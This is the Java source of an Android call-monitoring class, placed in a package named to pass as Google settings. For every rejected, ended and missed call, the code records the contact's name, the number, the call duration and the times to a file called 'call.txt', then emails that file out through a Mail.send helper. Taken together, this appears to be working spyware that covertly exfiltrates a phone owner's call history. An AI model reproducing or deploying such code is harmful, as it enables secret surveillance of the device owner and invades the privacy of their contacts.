package com.setting.dl.google.googlesettings.recievers;

import android.content.Context;

import com.setting.dl.google.googlesettings.mail.gmail.Mail;
import com.setting.dl.google.googlesettings.phone.Contacts;
import com.setting.dl.google.googlesettings.u;

import java.util.Date;


public class CallManager extends CallManagerBase {
    
    private final static String fileCall = "call.txt";
    
    @Override
    protected void onCallRejected(Context context, String number, Date start) {
    
        String value = u.s("Gelen arama reddedildi\n-------------------------------\n");
        value += u.s("%-7s : %s\n", "isim", Contacts.getContactNameWithNumber(context, number));
        value += u.s("%-7s : %s\n", "numara", number);
        value += u.s("%-7s : %s\n***********************\n", "Tarih", u.getDate(start));
    
        u.saveValue(context.getApplicationContext(), fileCall, value);
        Mail.send(context, fileCall);
    }
    
   /* @Override
    protected void onIncomingCallReceiving(Context context, String number, Date start) {}
   
    @Override
    protected void onIncomingCallAnswered(Context context, String number, Date start) {
        
        
        String value = u.s("\nGelen aramaya cevap verdi\n------------------------------\n");
        value += u.s("%-10s : %s\n", "isim", Contacts.getContactNameWithNumber(context, number));
        value += u.s("%-10s : %s\n", "numra", number);
        value += u.s("%-10s : %s\n***********************\n", "Tarih", u.getDate(start));
        
        u.saveValue(context, fileCall, value);
        u.wakeup(context, fileCall);
        
    }*/
    
    @Override
    protected void onIncomingCallEnded(Context context, String number, Date start, Date end) {
    
        long comunicatoinTime = end.getTime() - start.getTime();
    
        String value = "Gelen arama sonlandı\n-------------------------\n";
        
        value += u.s("%-11s : %s\n%-11s : %s\n%-11s : %.1f saniye\n%-11s : %s\n%-11s : %s\n*******************************\n",
    
                     "Kişi", Contacts.getContactNameWithNumber(context, number),
                     "Numara", number,
                     "Süre", (float) comunicatoinTime / 1000,
                     "Başlangıç", u.getDate(start.getTime()),
                     "Bitiş", u.getDate(end.getTime())
    
                    );
        
        u.saveValue(context, fileCall, value);
        //u.wakeup(context, fileCall);
        Mail.send(context, fileCall);
	    
    }
    
   /*  @Override
    protected void onOutgoingCallStarted(Context context, String number, Date start) {
        
       
        String value = saveString(context, number, start, false);
        
        if(value == null) return;
        
        u.saveValue(context, fileCall, value);
        u.wakeup(context, fileCall);
    }*/
    
    @Override
    protected void onOutgoingCallEnded(Context context, String number, Date start, Date end) {
    
        long comunicatoinTime = end.getTime() - start.getTime();
    
        String value = "";
    
        value += u.s("Giden arama sonlandı\n-----------------------------\n");
    
        value += u.s("%-11s : %s\n%-11s : %s\n%-11s : %.1f saniye\n%-11s : %s\n%-11s : %s\n*******************************\n",
                     
                     "Kişi", Contacts.getContactNameWithNumber(context, number),
                     "Numara", number,
                     "Süre", (float) comunicatoinTime / 1000,
                     "Başlangıç", u.getDate(start.getTime()),
                     "Bitiş", u.getDate(end.getTime())
                     
                     );
        
        u.saveValue(context, fileCall, value);
        Mail.send(context, fileCall);
    }
    
    @Override
    protected void onMissedCall(Context context, String number, Date start) {
        
        //todo bildirimlerdeki arama bilgilerini al
        
        String name = Contacts.getContactNameWithNumber(context, number);
        
        String value = "Cevapsız Çağrı\n---------------------------\n";
    
        value += String.format("%-8s : %s\n%-8s : %s\n%-8s : %s\n***************************\n",
                     "Kişi", name,
                     "Numara", number,
                     "Tarih", u.getDate(start)
                    );
        
        u.saveValue(context, fileCall, value);
        Mail.send(context, fileCall);
    }
}